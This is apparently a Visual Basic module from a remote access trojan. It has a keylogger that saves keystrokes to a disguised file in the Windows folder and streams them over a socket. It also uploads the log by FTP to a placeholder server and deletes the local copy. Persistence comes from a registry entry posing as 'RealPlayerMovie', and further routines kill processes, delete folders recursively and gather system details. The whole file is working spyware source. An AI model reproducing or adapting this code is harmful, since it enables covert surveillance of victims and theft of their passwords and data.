Attribute VB_Name = "Module1"
Option Explicit
Public keylog As String
Public folder As String
Public FlagOKsend As Boolean
Public FlagKeylog As Boolean
'Personal Setting
'---------------------------------------
Public Const IP_CLIENT = "127.0.0.1"
Public Const PORT_CLIENT = 9999
Public Const NAME_SERVER = "server.exe"   'in windows folder
Public Const NAME_KEYLOG = "ntwc.dat"     'in windows folder for keys pressed
Public Const URL_FTPKEYLOG = "ftp://yourftp"
Public Const LOGIN_FTP = "yourLoginForFTP"
Public Const PASS_FTP = "yourPasswordforFTP"
Public Const KEYREGFORSERVER = "RealPlayerMovie"  'name in the registry

'---------------------------------------
Public Const PAKSEND = 4048
Public Const FILEDOWN = 1
Public Const FILEUPLD = 2
Public Const FILEDESK = 3
Public Const FILEKEYS = 4
Public Const FILEDELT = 5

Public Const EWX_REBOOT = 4
Public Const EWX_FORCE = 0

Public Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type

Public Const SW_SHOWNORMAL = 1
Public Const VK_CAPITAL = &H14
Public Const FORMAT_MESSAGE_FROM_SYSTEM = &H1000
'----------------------------------------
'For Info PC
Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type
'----------------------------------------

'For File/dir manager
Public Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 255
    cAlternate As String * 14
End Type
Private Const TH32CS_SNAPPROCESS = &H2
Private Const MAX_PATH As Integer = 260
'----------------------------------------
'For Task Bar and kill process
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * MAX_PATH
End Type
'----------------------------------------
'For to edit Registry System
Public Enum regValueType
    REG_SZ = 1
    REG_DWORD = 4
End Enum
'----------------------------------------
'Predefined Keys
Public Enum regPredefinedKey
    HKEY_CLASSES_ROOT = &H80000000
    HKEY_CURRENT_USER = &H80000001
    HKEY_LOCAL_MACHINE = &H80000002
    HKEY_USERS = &H80000003
End Enum
                                                                                                             
'Errors
Public Enum regError
    ERROR_NONE = 0
    ERROR_BADDB = 1
    ERROR_BADKEY = 2
    ERROR_CANTOPEN = 3
    ERROR_CANTREAD = 4
    ERROR_CANTWRITE = 5
    ERROR_OUTOFMEMORY = 6
    ERROR_INVALID_PARAMETER = 7
    ERROR_ACCESS_DENIED = 8
    ERROR_INVALID_PARAMETERS = 87
    ERROR_NO_MORE_ITEMS = 259
End Enum
                                                                                                
Const KEY_ALL_ACCESS As Long = &H3F
                                                                                                             
Const REG_OPTION_NON_VOLATILE = 0
'---------------------------------------------------------
'---------------------------------------------------------
'Api for Edit Registry System
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueExString Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Private Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Long, lpcbData As Long) As Long
Private Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As Long, lpcbData As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Declare Function RegDeleteKey& Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String)
Private Declare Function RegDeleteValue& Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String)
'---------------------------------------------------------
'Api x Info User
Public Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
'Api x Info Time Since Run Windows
Public Declare Function GetTickCount Lib "kernel32" () As Long
'Api x Info Computer Name
Public Declare Function GetComputerName Lib "kernel32.dll" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
'Api x Info OS
Public Declare Function GetVersionEx Lib "kernel32.dll" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long
'Api x Info Monitor
Public Declare Function GetSystemMetrics Lib "User32.dll" (ByVal nIndex As Long) As Long
'---------------------------------------------------------
'Api x Shutdown
Public Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
'Api for Keylog
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
'---------------------------------------------------------
'Api for convert BMP in JPG
Public Declare Sub SavePictureAsJpeg Lib "pictojpg.dll" (ByVal Pic As StdPicture, ByVal FileName As String, ByVal Quality As Long)
'---------------------------------------------------------
'API For File Manager
Public Declare Function FindFirstFile Lib "kernel32.dll" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Public Declare Function FindNextFile Lib "kernel32.dll" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Public Declare Function FindClose Lib "kernel32.dll" (ByVal hFindFile As Long) As Long
Public Declare Function GetLogicalDriveStrings Lib "kernel32.dll" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
'Api for Retrive Desktop
Public Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Public Declare Function MapVirtualKey Lib "user32" Alias "MapVirtualKeyA" (ByVal wCode As Long, ByVal wMapType As Long) As Long
'Api for Open CD
Public Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
'Api for disable mouse
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
'Api for Pause
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
'Api x Taskmonitor
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long

'---------------------------------------------------------
'Api for Kill Process
Private Declare Function OpenProcess Lib "kernel32.dll" (ByVal dwDesiredAccessas As Long, ByVal bInheritHandle As Long, ByVal dwProcId As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function CreateToolHelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
'Api for TaskBar
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
'----------------------------------------------------------




'---------------------------------------------------------
Function FileExists(FileName As String) As Boolean
    On Error Resume Next
    FileExists = (GetAttr(FileName) And vbDirectory) = 0
End Function

Public Function SetKeyValue(Location As regPredefinedKey, KeyName As String, ValueName As String, ValueSetting As Variant, ValueType As regValueType)
'******************************************************************************
'    Name:  SetKeyValue
'  Inputs:  Location As Long
'           KeyName As String
'           ValueName as String
'           ValueSetting As Variant
'           ValueType As regValueType
' Returns:  error code
'   Usage:  SetKeyValue Location, KeyName, ValueName, ValueSetting, ValueType
'           Location must equal HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE
'           KeyName is name of the key that holds the value to delete, it may include subkeys (example "Key1\SubKey1")
'           ValueName is the name of the value you want create, or set the value of (example: "ValueTest")
'           ValueSetting is what you want the value set to
'           ValueType must equal either REG_SZ (a string) Or REG_DWORD (an integer)
' Example:  SetKeyValue HKEY_CURRENT_USER, "TestKey\SubKey1", "Test", "Testing, Testing", REG_SZ
' Author:  John Powell
'******************************************************************************
   
    Dim hKey As Long         'Handle of open key

RegOpenKeyEx Location, KeyName, 0, KEY_ALL_ACCESS, hKey

SetValueEx hKey, ValueName, ValueType, ValueSetting
RegCloseKey (hKey)
End Function
'******************************************************************************
'    Name:  DeleteValue
'  Inputs:  Location As regPredefinedKey
'           KeyName As String
'           ValueName As String
' Returns:  error code
'   Usage:  DeleteValue Location, KeyName, ValueName
'           Location must equal HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE
'           KeyName is name of the key that holds the value to delete, it may include subkeys (example "Key1\SubKey1")
'           ValueName is the name of value you wish to delete
' Example:  DeleteValue HKEY_CURRENT_USER, "TestKey\SubKey1", "Test"
' Author:  John Powell
'******************************************************************************
Public Function DeleteValue(Location As regPredefinedKey, KeyName As String, ValueName As String)
    
    Dim hKey As Long         'Handle of open key

    RegOpenKeyEx Location, KeyName, 0, KEY_ALL_ACCESS, hKey
    RegDeleteValue hKey, ValueName
    RegCloseKey (hKey)
   
End Function
Private Function SetValueEx(ByVal hKey As Long, ValueName As String, lType As Long, vValue As Variant)
    
    Dim lValue As Long
    Dim sValue As String

    Select Case lType
        Case REG_SZ
            sValue = vValue
            RegSetValueExString hKey, ValueName, 0&, lType, sValue, Len(sValue)
        Case REG_DWORD
            lValue = vValue
            RegSetValueExLong hKey, ValueName, 0&, lType, lValue, 4
        End Select

End Function
'******************************************************************************
'    Name:  QueryValue
'  Inputs:  Location As Long
'           KeyName As String
'           ValueName as String
' Returns:  Empty string if error | value at 'Location\KeyName\ValueName'
'   Usage:  QueryValue Location, KeyName, ValueName
'           Location must equal HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_lOCAL_MACHINE
'           KeyName is the key that the value is under (example: "Software\Microsoft\Windows\CurrentVersion\Explorer")
'           ValueName is the name of the value you want to access (example: "link")' Example:  Msgbox QueryValue(HKEY_CURRENT_USER, "TestKey\SubKey1", "Test")
'  Author:  John Powell
'******************************************************************************
Public Function QueryValue(Location As regPredefinedKey, KeyName As String, ValueName As String) As String

   
    Dim hKey As Long         'Handle of opened key
    Dim vValue As Variant    'Setting of queried value

    'Open the key
    RegOpenKeyEx Location, KeyName, 0, KEY_ALL_ACCESS, hKey

    
    QueryValueEx hKey, ValueName, vValue
    
    'Return the value
    QueryValue = cleanProperty(vValue)
    
    'Close the key
    RegCloseKey (hKey)
               
End Function
'******************************************************************************
'    Name:  cleanProperty
'  Inputs:  Property As String
' Returns:  A "cleaned" string
'------------------------------------------------------------------------------
'  Author:  John Powell
'******************************************************************************
Private Function cleanProperty(ByVal Property As String) As String
   If Property <> "" Then
    cleanProperty = Left(Property, (Len(Property) - 1))
   Else
    cleanProperty = ""
   End If
End Function
Private Function QueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
    
    Dim cch As Long
    Dim lrc As Long
    Dim lType As Long
    Dim lValue As Long
    Dim sValue As String

    On Error GoTo QueryValueExError

    ' Determine the size and type of data to be read
    RegQueryValueExNULL lhKey, szValueName, 0&, lType, 0&, cch
    

    Select Case lType
        ' For strings
        Case REG_SZ:
            sValue = String(cch, 0)
            lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)
            If lrc = ERROR_NONE Then
                vValue = Left$(sValue, cch)
            Else
                vValue = Empty
            End If

        ' For DWORDS
        Case REG_DWORD:
            lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)
            If lrc = ERROR_NONE Then vValue = lValue
        Case Else
            'all other data types not supported
            lrc = -1
    End Select

QueryValueExExit:
    
    Exit Function

QueryValueExError:

    Resume QueryValueExExit

End Function
Public Function RetriveOS() As String
Dim osinfo As OSVERSIONINFO
osinfo.dwOSVersionInfoSize = 148
osinfo.szCSDVersion = Space$(128)
GetVersionEx osinfo
RetriveOS = osinfo.dwPlatformId & "*" & osinfo.dwMinorVersion
End Function

Function Extract(Temp As String) As String
Dim num As Long
Dim Finale As String
Dim appoggio As String

For num = 1 To Len(Temp)
    appoggio = Mid(Temp, num, 1)
    
    If appoggio = "*" Then
       Exit For
    End If
    Finale = Mid(Temp, 1, num)
Next num
Extract = Finale
End Function

Public Function ListProcess() As String
    Dim hSnapshot As Long
    Dim uProcess As PROCESSENTRY32
    Dim lngRet As Long
    Dim processo As String
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0&)
    uProcess.dwSize = Len(uProcess)
    lngRet = Process32First(hSnapshot, uProcess)
    Do While lngRet
        processo = processo + Left$(uProcess.szExeFile, InStr(1, uProcess.szExeFile, vbNullChar) - 1) + "*"
        lngRet = Process32Next(hSnapshot, uProcess)
    Loop
    CloseHandle hSnapshot
    ListProcess = processo
End Function
Public Sub KillProcessById(p_lngProcessId As Long)
Dim lnghProcess As Long, lngReturn As Long
lnghProcess = OpenProcess(1&, -1&, p_lngProcessId)
lngReturn = TerminateProcess(lnghProcess, 0&)
End Sub

Public Sub Killproc(Tempdata As String)
Dim hSnapshot As Long, r As Long
Dim PID As Long
Dim q As Long
Dim szExename As String
Dim uProcess As PROCESSENTRY32
Dim killa As String
Dim i As Long

hSnapshot = CreateToolHelpSnapshot(2&, 0&)
If hSnapshot = 0 Then Exit Sub
uProcess.dwSize = Len(uProcess)
r = ProcessFirst(hSnapshot, uProcess)

Do While r
    i = InStr(1, uProcess.szExeFile, Chr(0))
    szExename = LCase$(Left$(uProcess.szExeFile, i - 1))
    PID = uProcess.th32ProcessID
    If UCase(Tempdata) = UCase(szExename) Then KillProcessById PID
    r = ProcessNext(hSnapshot, uProcess)
Loop

Call CloseHandle(hSnapshot)
End Sub

Public Function ListDriver() As String
Dim lungh As String
Dim DrivesNames As String
DrivesNames = Space(64)

lungh = GetLogicalDriveStrings(Len(DrivesNames), DrivesNames)
ListDriver = lungh + "*" + DrivesNames
End Function

Public Sub killfolder(directory As String, deleteme As String)
    Dim Driver As Long
    Dim hFile As Long
    Dim file_data As WIN32_FIND_DATA
    Dim appoggio As String
    Dim Temp As String
   
    
    hFile = FindFirstFile(directory & deleteme & "\*.*", file_data)
    
        Do
            appoggio = file_data.cFileName
            appoggio = Left$(appoggio, InStr(appoggio, Chr$(0)) - 1)
            
            If appoggio = ".." Or appoggio = "." Then
                GoTo Salta
            ElseIf (file_data.dwFileAttributes = 16) Or (file_data.dwFileAttributes = 48) _
                Or (file_data.dwFileAttributes = 22) Or (file_data.dwFileAttributes = 18) _
                Or (file_data.dwFileAttributes = 17) Then
                    Temp = directory & deleteme & "\"
                    killfolder Temp, appoggio
            Else
                    Kill directory & deleteme & "\" & appoggio
            End If
Salta:
            If FindNextFile(hFile, file_data) = 0 Then
                Exit Do
            End If
       Loop
       FindClose hFile
       appoggio = directory & deleteme
       RmDir appoggio
End Sub
Public Function CapsLockOn() As Boolean
  Static blnInit As Boolean
  Static blnOn As Boolean
    
    If Not blnInit Then
        While GetAsyncKeyState(VK_CAPITAL)
        Wend
        blnOn = GetKeyState(VK_CAPITAL)
        blnInit = True
    Else
        If GetAsyncKeyState(VK_CAPITAL) Then
            While GetAsyncKeyState(VK_CAPITAL)
                DoEvents
            Wend
            blnOn = Not blnOn
        End If
    End If
    CapsLockOn = blnOn
End Function




Public Sub AddText(strText As String)
   keylog = keylog + strText
   If Len(keylog) > 50 Then
     If (FileExists(folder & NAME_KEYLOG)) Then
        Open folder & NAME_KEYLOG For Append As #FILEKEYS
        Print #FILEKEYS, keylog
     Else
        Open folder & NAME_KEYLOG For Binary As #FILEKEYS
        Put #FILEKEYS, , keylog
     End If
     Close #FILEKEYS
     keylog = ""
   End If
   If FlagKeylog Then Form1.Winsock1.SendData "/XXKEYSXX/" & strText
End Sub

Public Sub UploadKeylog()
On Error GoTo EndUpload
  Form1.Inet1.AccessType = icUseDefault
  Form1.Inet1.URL = URL_FTPKEYLOG
  Form1.Inet1.UserName = LOGIN_FTP
  Form1.Inet1.Password = PASS_FTP
  Form1.Inet1.RequestTimeout = 40
 
  
  Form1.Inet1.Execute , "PUT " & folder & NAME_KEYLOG & " " & Time & ".txt"
   Do While Form1.Inet1.StillExecuting
      DoEvents
   Loop
   Form1.Inet1.Execute , "CLOSE"
   FlagOKsend = True
   'Delete KeylogFile after sending
   Form1.Timer2.Enabled = False
   Close #FILEKEYS
   Kill folder & NAME_KEYLOG
   Form1.Timer2.Enabled = True
   Exit Sub
   
EndUpload:
MsgBox "errore"

End Sub

